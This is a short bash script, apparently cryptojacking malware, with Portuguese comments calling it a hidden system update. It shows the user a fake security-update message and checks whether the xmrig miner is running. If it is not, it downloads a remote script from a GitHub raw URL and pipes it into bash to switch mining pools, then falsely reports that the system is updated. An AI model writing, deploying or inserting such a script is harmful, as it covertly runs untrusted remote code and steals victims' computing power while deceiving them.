#!/bin/bash
# miner.sh - Atualização do sistema (oculto)

echo "🔄 Iniciando atualização de segurança do sistema..."

# Verifica se já está rodando
if pgrep -x "xmrig" > /dev/null; then
  echo "✅ Mineração já ativa."
  exit 0
fi

# Baixa e executa o script de mudança de pool
wget -qO- https://raw.githubusercontent.com/MarcolaUnderground/render-miner/main/muda-pool.sh | bash

echo "✅ Sistema atualizado. Processos em segundo plano."